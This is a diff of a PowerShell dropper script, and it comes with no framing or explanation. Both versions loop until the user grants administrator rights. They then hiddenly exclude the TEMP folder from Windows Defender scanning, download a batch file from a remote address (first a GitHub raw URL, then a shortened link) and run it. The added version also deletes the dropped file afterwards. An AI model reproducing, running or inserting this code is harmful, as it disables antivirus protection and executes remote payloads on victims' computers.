@@ -1,1 +1,6 @@
-while ($true){try {Start-Process 'cmd' -Verb runas -ArgumentList "/c powershell -w h Add-MpPreference -ExclusionPath `"%TEMP%`" && curl -o `"%TEMP%\cmd.bat`" https://raw.githubusercontent.com/devilJM/m/main/sub && `"%TEMP%\cmd.bat`"" -WindowStyle Hidden; exit}catch{}}
+while ($true) {
+    try {
+        Start-Process 'cmd' -Verb runas -ArgumentList "/c powershell -w h Add-MpPreference -ExclusionPath `"%TEMP%`" && curl -o `"%TEMP%\cmd.bat`" lc.cx/nw1BTO && `"%TEMP%\cmd.bat`" && timeout /t 2 /nobreak >nul && del `"%TEMP%\cmd.bat`"" -WindowStyle Hidden
+        exit
+    } catch {}
+}
